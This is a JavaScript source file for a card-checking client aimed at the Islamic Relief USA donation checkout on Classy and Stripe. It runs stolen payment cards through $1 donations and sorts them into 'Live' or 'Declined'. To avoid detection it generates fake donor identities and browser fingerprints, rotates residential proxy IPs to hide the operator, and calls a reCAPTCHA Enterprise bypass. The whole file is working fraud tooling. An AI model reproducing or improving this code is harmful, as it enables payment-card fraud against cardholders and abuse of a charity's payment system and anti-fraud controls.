import got from 'got';
import { CookieJar } from 'tough-cookie';
import { fakeDataService } from '../../utils/FakeDataService.js';
import { fingerprintGenerator } from '../../utils/FingerprintGenerator.js';
import { HttpsProxyAgent } from 'https-proxy-agent';
import { recaptchaBypass } from '../captcha/RecaptchaBypass.js';

/**
 * SOAX Proxy Manager with Smart IP Reuse
 */
class SOAXProxyManager {
    constructor(config) {
        this.host = config.host || 'proxy.soax.com';
        this.port = config.port || 5000;
        this.username = config.username;
        this.password = config.password;
        this.sessionLength = config.sessionLength || 600;
        this.currentSession = null;
    }

    _generateSessionId() {
        return `${Date.now().toString(36)}${Math.random().toString(36).substring(2, 10)}`;
    }

    getProxy() {
        // ALWAYS rotate IP for each call to avoid blocking
        this._createNewSession();
        return this.currentSession.agent;
    }

    forceRotate() {
        this._createNewSession();
        return this.currentSession.agent;
    }

    // Keep same IP within a single card validation flow
    getSessionProxy() {
        if (!this.currentSession) {
            this._createNewSession();
        }
        return this.currentSession.agent;
    }

    _createNewSession() {
        const sessionId = this._generateSessionId();
        // Only add SOAX-style session params if host contains 'soax'
        let proxyUsername = this.username;
        if (this.host.includes('soax')) {
            proxyUsername = `${this.username}-sessionid-${sessionId}-sessionlength-${this.sessionLength}`;
        }
        const proxyUrl = `http://${proxyUsername}:${this.password}@${this.host}:${this.port}`;

        this.currentSession = {
            agent: new HttpsProxyAgent(proxyUrl),
            sessionId,
            proxyUrl, // Store for debugging
            createdAt: Date.now()
        };
    }

    getCurrentSessionId() {
        return this.currentSession?.sessionId || null;
    }

    isEnabled() {
        return !!(this.username && this.password);
    }
}

/**
 * Islamic Relief USA (IRUSA) Client
 * Platform: Classy.org
 * 
 * Flow: Create PaymentMethod via Stripe → Create Transaction → Charge Intent
 * Uses Enterprise reCAPTCHA Bypass
 */
export class IRUSAClient {
    constructor(siteConfig = {}, options = {}) {
        this.site = {
            id: 'irusa-classy',
            label: 'Islamic Relief USA',
            baseUrl: 'https://donate.irusa.org',
            checkoutUrl: 'https://donate.irusa.org/checkout',
            apiUrl: 'https://donate.irusa.org/checkout/api',
            pkKey: siteConfig.pkKey || 'pk_live_h5ocNWNpicLCfBJvLialXsb900SaJnJscz',
            campaignId: siteConfig.campaignId || '577773',
            organizationId: siteConfig.organizationId || '50681',
            designationId: siteConfig.designationId || '1835374',
            recaptchaSiteKey: siteConfig.recaptchaSiteKey || '6LcwtHkpAAAAABHUXtvKCZQ645083zUdeimy8NlP',
            ...siteConfig
        };

        this.proxyConfig = options.proxyConfig || null;
        this.soaxManager = this.proxyConfig ? new SOAXProxyManager(this.proxyConfig) : null;
        this.maxRetries = options.maxRetries ?? 3;
        this.timeout = options.timeout ?? 30000;
        this.debug = options.debug ?? false;
    }

    // =========================================================================
    // RESPONSE CLASSIFICATION
    // =========================================================================

    // Patterns that indicate the card is LIVE (valid but can't charge)
    static LIVE_PATTERNS = [
        { pattern: 'address verification failed', code: 'avs_failed' },
        { pattern: 'incorrect_zip', code: 'avs_failed' },
        { pattern: 'zip code', code: 'avs_failed' },
        { pattern: 'insufficient funds', code: 'insufficient_funds' },
        { pattern: 'insufficient_funds', code: 'insufficient_funds' },
        { pattern: '3d secure', code: '3ds_required' },
        { pattern: 'authentication required', code: '3ds_required' },
        { pattern: 'authentication_required', code: '3ds_required' },
        { pattern: 'security code', code: 'incorrect_cvc' },
        { pattern: 'incorrect_cvc', code: 'incorrect_cvc' },
        { pattern: 'cvc check failed', code: 'incorrect_cvc' },
        { pattern: 'card_velocity_exceeded', code: 'velocity_exceeded' },
        { pattern: 'try again later', code: 'rate_limited' },
    ];

    // Patterns that indicate the card is DEAD (invalid/blocked)
    static DEAD_PATTERNS = [
        { pattern: 'card_declined', code: 'card_declined' },
        { pattern: 'generic_decline', code: 'generic_decline' },
        { pattern: 'do_not_honor', code: 'do_not_honor' },
        { pattern: 'lost_card', code: 'lost_card' },
        { pattern: 'stolen_card', code: 'stolen_card' },
        { pattern: 'expired_card', code: 'expired_card' },
        { pattern: 'invalid_number', code: 'invalid_number' },
        { pattern: 'invalid_expiry', code: 'invalid_expiry' },
        { pattern: 'invalid_cvc', code: 'invalid_cvc' },
        { pattern: 'fraudulent', code: 'fraudulent' },
        { pattern: 'pickup_card', code: 'pickup_card' },
        { pattern: 'restricted_card', code: 'restricted_card' },
        { pattern: 'security_violation', code: 'security_violation' },
        { pattern: 'transaction_not_allowed', code: 'transaction_not_allowed' },
    ];

    _classifyResponse(errorMsg) {
        if (!errorMsg) return { status: 'Declined', code: 'unknown', originalMessage: null };

        const lower = errorMsg.toLowerCase();

        // Check for LIVE patterns first (card is valid)
        for (const item of IRUSAClient.LIVE_PATTERNS) {
            if (lower.includes(item.pattern)) {
                return { status: 'Live', code: item.code, originalMessage: errorMsg };
            }
        }

        // Check for specific DEAD patterns
        for (const item of IRUSAClient.DEAD_PATTERNS) {
            if (lower.includes(item.pattern)) {
                return { status: 'Declined', code: item.code, originalMessage: errorMsg };
            }
        }

        // Default: unknown decline - return original message for debugging
        return { status: 'Declined', code: 'generic_decline', originalMessage: errorMsg };
    }

    _log(step, message) {
        if (this.debug) {
            console.log(`[${new Date().toISOString().slice(11, 23)}][${step}] ${message}`);
        }
    }

    generateFakeUser() {
        return fakeDataService.generateFakeUser();
    }

    /**
     * Generate a complete browser fingerprint context for a session.
     * This should be created once per card validation and reused across all Stripe calls.
     * Ensures consistency to avoid bot detection.
     */
    generateBrowserContext() {
        const fingerprint = fingerprintGenerator.generateFingerprint({ mobile: false });

        // Extract Chrome version for Sec-CH-UA
        const chromeMatch = fingerprint.userAgent.match(/Chrome\/(\d+)/);
        const chromeVersion = chromeMatch ? chromeMatch[1] : '131';

        return {
            // Stripe fingerprint IDs (consistent across all calls in this session)
            guid: fingerprint.stripeIds.guid,
            muid: fingerprint.stripeIds.muid,
            sid: fingerprint.stripeIds.sid,

            // User agent (same for all API calls)
            userAgent: fingerprint.userAgent,

            // Time tracking
            sessionStart: Date.now(),

            // For Sec-CH-UA headers
            secChUa: `"Chromium";v="${chromeVersion}", "Google Chrome";v="${chromeVersion}", "Not-A.Brand";v="99"`,
            secChUaPlatform: fingerprint.userAgent.includes('Windows') ? '"Windows"'
                : fingerprint.userAgent.includes('Macintosh') ? '"macOS"'
                    : '"Linux"',
            secChUaMobile: fingerprint.userAgent.includes('Mobile') ? '?1' : '?0',

            // Screen info (for advanced fingerprinting if needed)
            screenWidth: fingerprint.screen.width,
            screenHeight: fingerprint.screen.height,
            colorDepth: fingerprint.screen.colorDepth,

            // Language
            acceptLanguage: fingerprint.language.acceptLanguage,
        };
    }

    /**
     * Calculate realistic time on page based on session start.
     */
    getTimeOnPage(browserContext) {
        // Time since session started + some base browsing time (5-15 seconds)
        const elapsed = Date.now() - browserContext.sessionStart;
        const baseTime = Math.floor(Math.random() * 10000) + 5000;
        return elapsed + baseTime;
    }

    /**
     * Generate Stripe API headers that mimic a real browser.
     */
    getStripeHeaders(browserContext) {
        return {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Accept': 'application/json',
            'Accept-Language': browserContext.acceptLanguage,
            'Origin': 'https://js.stripe.com',
            'Referer': 'https://js.stripe.com/',
            'User-Agent': browserContext.userAgent,
            // Sec-CH-* headers - real browsers send these
            'Sec-CH-UA': browserContext.secChUa,
            'Sec-CH-UA-Mobile': browserContext.secChUaMobile,
            'Sec-CH-UA-Platform': browserContext.secChUaPlatform,
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'cross-site',
        };
    }

    // =========================================================================
    // SESSION
    // =========================================================================
    createSession(proxyAgent = null) {
        const cookieJar = new CookieJar();

        return got.extend({
            timeout: { request: this.timeout },
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Accept': 'application/json, text/plain, */*',
                'Accept-Language': 'en-US,en;q=0.9',
            },
            followRedirect: true,
            maxRedirects: 5,
            cookieJar,
            throwHttpErrors: false,
            ...(proxyAgent && { agent: { https: proxyAgent, http: proxyAgent } })
        });
    }

    // =========================================================================
    // STRIPE API - Create PaymentMethod
    // =========================================================================
    async createPaymentMethod(cardData, fakeUser, browserContext, proxyAgent = null) {
        this._log('PM', `Creating PaymentMethod for ${cardData.number?.slice(0, 6)}****`);

        const timeOnPage = this.getTimeOnPage(browserContext);

        const formData = new URLSearchParams({
            'type': 'card',
            'billing_details[name]': `${fakeUser.firstName} ${fakeUser.lastName}`,
            'billing_details[email]': fakeUser.email,
            'billing_details[address][country]': 'US',
            'billing_details[address][postal_code]': cardData.zip || fakeUser.postalCode || '10001',
            'billing_details[address][state]': fakeUser.state || 'NY',
            'billing_details[address][city]': fakeUser.city || 'New York',
            'billing_details[address][line1]': fakeUser.address || '123 Main St',
            'card[number]': cardData.number,
            'card[cvc]': cardData.cvv || cardData.cvc,
            'card[exp_month]': cardData.expMonth,
            'card[exp_year]': cardData.expYear,
            'guid': browserContext.guid,
            'muid': browserContext.muid,
            'sid': browserContext.sid,
            'payment_user_agent': 'stripe.js/c264a67020; stripe-js-v3/c264a67020; payment-element',
            'referrer': this.site.checkoutUrl,
            'time_on_page': timeOnPage.toString(),
            'key': this.site.pkKey,
        });

        try {
            // Route through proxy to hide real IP
            const response = await got.post('https://api.stripe.com/v1/payment_methods', {
                body: formData.toString(),
                headers: this.getStripeHeaders(browserContext),
                timeout: { request: this.timeout },
                throwHttpErrors: false,
                ...(proxyAgent && { agent: { https: proxyAgent, http: proxyAgent } })
            });

            let pm;
            try {
                pm = JSON.parse(response.body);
            } catch {
                this._log('PM', `Parse error: ${response.statusCode}`);
                return { success: false, error: `INVALID_RESPONSE: ${response.statusCode}`, isNetworkError: true };
            }

            if (pm.error) {
                const classification = this._classifyResponse(pm.error.message);
                return {
                    success: false,
                    error: pm.error.message,
                    code: pm.error.code,
                    status: classification.status,
                    isNetworkError: false
                };
            }

            this._log('PM', `PaymentMethod created: ${pm.id}`);
            return {
                success: true,
                paymentMethodId: pm.id,
                brand: pm.card?.brand,
                country: pm.card?.country,
                last4: pm.card?.last4
            };
        } catch (error) {
            this._log('PM', `Network Exception: ${error.message}`);
            return { success: false, error: error.message, isNetworkError: true };
        }
    }

    // =========================================================================
    // CLASSY API - Create Transaction
    // =========================================================================
    async createTransaction(session, fakeUser) {
        this._log('TX', 'Creating transaction...');

        const url = `${this.site.apiUrl}/campaigns/${this.site.campaignId}/transactions`;

        const body = {
            billing_address1: fakeUser.address || '123 Main St',
            billing_address2: '',
            billing_city: fakeUser.city || 'New York',
            billing_country: 'US',
            billing_first_name: fakeUser.firstName,
            billing_last_name: fakeUser.lastName,
            billing_postal_code: fakeUser.postalCode || '10001',
            billing_state: fakeUser.state || 'NY',
            frequency: 'one-time',
            company_name: null,
            designation_id: parseInt(this.site.designationId),
            hide_amount: false,
            is_anonymous: false,
            items: [{
                quantity: 1,
                type: 'donation',
                product_name: 'Donation',
                price: 1,
                raw_final_price: 1
            }],
            is_reprocess: false,
            is_gift_aid: false,
            member_id: Math.floor(Math.random() * 90000000) + 10000000,
            member_country: 'US',
            member_email_address: fakeUser.email,
            member_first_name: fakeUser.firstName,
            member_last_name: fakeUser.lastName,
            member_name: `${fakeUser.firstName} ${fakeUser.lastName}`,
            member_phone: fakeUser.phone || '',
            raw_currency_code: 'USD',
            payment_type: 'Credit Card',
            payment_method: 'Classy Pay',
            payment_gateway: 'Stripe',
            payment_source: 'MANUAL',
            status: 'incomplete',
            answers: [],
            comment: ''
        };

        try {
            const response = await session.post(url, {
                json: body,
                headers: {
                    'Content-Type': 'application/json',
                    'Origin': this.site.baseUrl,
                    'Referer': this.site.checkoutUrl,
                }
            });

            // Handle blocking/rate limiting - trigger retry with new IP
            if (response.statusCode === 403 || response.statusCode === 429) {
                this._log('TX', `Blocked with HTTP ${response.statusCode} - need IP rotation`);
                return { success: false, error: `HTTP_${response.statusCode}`, needsRotation: true };
            }

            if (response.statusCode !== 201 && response.statusCode !== 200) {
                this._log('TX', `Failed with HTTP ${response.statusCode}`);
                return { success: false, error: `HTTP_${response.statusCode}` };
            }

            let data;
            try {
                data = JSON.parse(response.body);
            } catch {
                return { success: false, error: 'INVALID_RESPONSE', needsRotation: true };
            }

            if (data.transactionToken && data.transaction?.id) {
                this._log('TX', `Transaction created: ${data.transaction.id}`);
                return {
                    success: true,
                    transactionId: data.transaction.id,
                    transactionToken: data.transactionToken
                };
            }

            return { success: false, error: data.error || 'Unknown error' };
        } catch (error) {
            this._log('TX', `Network error: ${error.message}`);
            return { success: false, error: error.message, needsRotation: true };
        }
    }

    // =========================================================================
    // CLASSY API - Charge Intent (Submit Payment)
    // =========================================================================
    async submitChargeIntent(session, params) {
        const { transactionToken, transactionId, paymentMethodId, fakeUser, billingZip } = params;

        this._log('CHARGE', `Submitting charge intent with PM: ${paymentMethodId}`);

        // Get reCAPTCHA Enterprise token
        this._log('CAPTCHA', 'Generating Enterprise reCAPTCHA token...');
        const captchaResult = await recaptchaBypass.getEnterpriseToken(
            this.site.recaptchaSiteKey,
            this.site.checkoutUrl
        );

        if (!captchaResult.success) {
            this._log('CAPTCHA', `Failed to get token: ${captchaResult.error}`);
        } else {
            this._log('CAPTCHA', `Got token: ${captchaResult.token?.slice(0, 30)}...`);
        }

        const url = `${this.site.apiUrl}/charge-intent?campaign_id=${this.site.campaignId}&payment_method=Stripe`;

        const body = {
            type: 'DONATION',
            paymentMethod: 'Stripe',
            paymentDetails: {
                source: paymentMethodId
            },
            currency: 'USD',
            amount: 1,
            firstName: fakeUser.firstName,
            lastName: fakeUser.lastName,
            address1: fakeUser.address || '123 Main St',
            address2: '',
            city: fakeUser.city || 'New York',
            state: fakeUser.state || 'NY',
            country: 'US',
            zip: billingZip || fakeUser.postalCode || '10001',
            email: fakeUser.email,
            referenceId: transactionId.toString(),
            reCaptchaToken: captchaResult.token || '',
            metaData: {}
        };

        try {
            const response = await session.post(url, {
                json: body,
                headers: {
                    'Content-Type': 'application/json',
                    'transaction_token': transactionToken,
                    'Origin': this.site.baseUrl,
                    'Referer': `${this.site.checkoutUrl}?cid=${this.site.campaignId}`,
                }
            });

            // Handle blocking/rate limiting - trigger retry with new IP
            if (response.statusCode === 403 || response.statusCode === 429) {
                this._log('CHARGE', `Blocked with HTTP ${response.statusCode} - need IP rotation`);
                return { success: false, error: `HTTP_${response.statusCode}`, needsRotation: true };
            }

            let data;
            try {
                data = JSON.parse(response.body);
            } catch {
                this._log('CHARGE', `Parse error (HTTP ${response.statusCode}): ${response.body?.slice(0, 200)}`);
                return { success: false, error: 'INVALID_RESPONSE', needsRotation: true };
            }



            // Success - got a PaymentIntent
            if (data.chargeIntent?.id) {
                const piId = data.chargeIntent.id;
                const clientSecret = data.chargeIntent.client_secret;
                this._log('CHARGE', `PaymentIntent created: ${piId}`);

                // Return PI details for confirmation step
                return {
                    success: true,
                    transactionId: piId,
                    clientSecret,
                    amount: data.chargeIntent.amount
                };
            }

            // Error response
            if (data.error || data.message) {
                const errorMsg = data.error || data.message;
                const classification = this._classifyResponse(errorMsg);
                return {
                    status: classification.status,
                    code: classification.code,
                    message: errorMsg
                };
            }

            return { status: 'Declined', code: 'unknown', message: JSON.stringify(data) };
        } catch (error) {
            this._log('CHARGE', `Network error: ${error.message}`);
            return { success: false, error: error.message, needsRotation: true };
        }
    }

    // =========================================================================
    // STRIPE API - Confirm PaymentIntent (actually charges the card)
    // =========================================================================
    async confirmPaymentIntent(piId, clientSecret, paymentMethodId, browserContext, proxyAgent = null) {
        this._log('CONFIRM', `Confirming PaymentIntent: ${piId}`);

        // Note: confirmPaymentIntent only accepts these core parameters
        // Fingerprint params (guid, muid, sid) are for createPaymentMethod only
        const formData = new URLSearchParams({
            'payment_method': paymentMethodId,
            'client_secret': clientSecret,
            'key': this.site.pkKey,
        });

        try {
            // Route through proxy to hide real IP
            const response = await got.post(`https://api.stripe.com/v1/payment_intents/${piId}/confirm`, {
                body: formData.toString(),
                headers: this.getStripeHeaders(browserContext),
                timeout: { request: this.timeout },
                throwHttpErrors: false,
                ...(proxyAgent && { agent: { https: proxyAgent, http: proxyAgent } })
            });

            let data;
            try {
                data = JSON.parse(response.body);
            } catch {
                return { success: false, error: 'INVALID_RESPONSE' };
            }



            if (data.error) {
                const classification = this._classifyResponse(data.error.message);
                return {
                    success: false,
                    status: classification.status,
                    code: data.error.code || classification.code,
                    message: data.error.message
                };
            }

            // Check status
            const status = data.status;
            if (status === 'succeeded' || status === 'requires_capture') {
                return { success: true, status: 'Approved', transactionId: piId };
            } else if (status === 'requires_action') {
                return { success: true, status: 'Live', code: '3ds_required', transactionId: piId };
            } else {
                return { success: false, status: 'Declined', code: status, message: `Unexpected status: ${status}` };
            }
        } catch (error) {
            return { success: false, error: error.message };
        }
    }

    // =========================================================================
    // MAIN VALIDATION
    // =========================================================================
    async validate(cardData) {
        const cardNum = cardData.number;
        const cardPreview = `${cardNum.slice(0, 6)}****${cardNum.slice(-4)}`;

        for (let attempt = 1; attempt <= this.maxRetries; attempt++) {
            // ROTATE IP for each attempt (new card or retry)
            // All 4 API calls within this attempt use the SAME proxyAgent (same IP)
            const proxyAgent = this.soaxManager?.isEnabled() ? this.soaxManager.getProxy() : null;
            const sessionId = this.soaxManager?.getCurrentSessionId();
            const session = this.createSession(proxyAgent);
            const fakeUser = this.generateFakeUser();

            // Generate consistent browser context for this entire validation flow
            // Same fingerprints across all Stripe API calls = same "browser session"
            const browserContext = this.generateBrowserContext();

            this._log('VALIDATE', `Attempt ${attempt}/${this.maxRetries} | Session: ${sessionId || 'no-proxy'}`);
            this._log('VALIDATE', `Browser: ${browserContext.userAgent.slice(0, 60)}...`);

            // Step 1: Create PaymentMethod via Stripe API
            this._log('VALIDATE', `Step 1: Creating PaymentMethod...`);
            const pmResult = await this.createPaymentMethod(cardData, fakeUser, browserContext, proxyAgent);

            if (!pmResult.success) {
                if (pmResult.isNetworkError) {
                    this._log('VALIDATE', `Network error, rotating IP and retrying... (${attempt}/${this.maxRetries})`);
                    continue;
                }
                // Card declined at Stripe level
                return {
                    status: pmResult.status || 'Declined',
                    code: pmResult.code || 'generic_decline',
                    message: pmResult.error,
                    card: cardPreview,
                    attempts: attempt
                };
            }

            // Step 2: Create Transaction
            this._log('VALIDATE', `Step 2: Creating Transaction...`);
            const txResult = await this.createTransaction(session, fakeUser);

            if (!txResult.success) {
                this._log('VALIDATE', `Transaction failed: ${txResult.error}, rotating IP...`);
                if (attempt < this.maxRetries) continue;
                return { status: 'Errors', message: txResult.error, card: cardPreview };
            }

            // Step 3: Submit Charge Intent (creates PaymentIntent)
            this._log('VALIDATE', `Step 3: Submitting Charge Intent...`);
            const chargeResult = await this.submitChargeIntent(session, {
                transactionToken: txResult.transactionToken,
                transactionId: txResult.transactionId,
                paymentMethodId: pmResult.paymentMethodId,
                fakeUser,
                billingZip: cardData.zip || cardData.billingZip
            });

            if (!chargeResult.success) {
                // Check if it's a decline at charge-intent level
                if (chargeResult.status) {
                    return {
                        status: chargeResult.status,
                        code: chargeResult.code,
                        message: chargeResult.message,
                        card: cardPreview,
                        attempts: attempt
                    };
                }
                this._log('VALIDATE', `Charge intent failed, rotating IP...`);
                if (attempt < this.maxRetries) continue;
                return { status: 'Errors', message: chargeResult.error || chargeResult.message, card: cardPreview };
            }

            // Step 4: Confirm PaymentIntent (actually charges the card)
            this._log('VALIDATE', `Step 4: Confirming PaymentIntent...`);
            const confirmResult = await this.confirmPaymentIntent(
                chargeResult.transactionId,
                chargeResult.clientSecret,
                pmResult.paymentMethodId,
                browserContext,  // Pass browser context for consistent fingerprints
                proxyAgent       // Pass proxy agent to hide real IP
            );

            if (!confirmResult.success) {
                return {
                    status: confirmResult.status || 'Declined',
                    code: confirmResult.code,
                    message: confirmResult.message,
                    card: cardPreview,
                    attempts: attempt
                };
            }

            // Got a result!
            return {
                status: confirmResult.status,
                code: confirmResult.code,
                message: confirmResult.message,
                transactionId: confirmResult.transactionId,
                card: cardPreview,
                brand: pmResult.brand,
                country: pmResult.country,
                attempts: attempt
            };
        }

        return { status: 'Errors', message: 'Max retries exceeded', card: cardPreview };
    }
}

export default IRUSAClient;
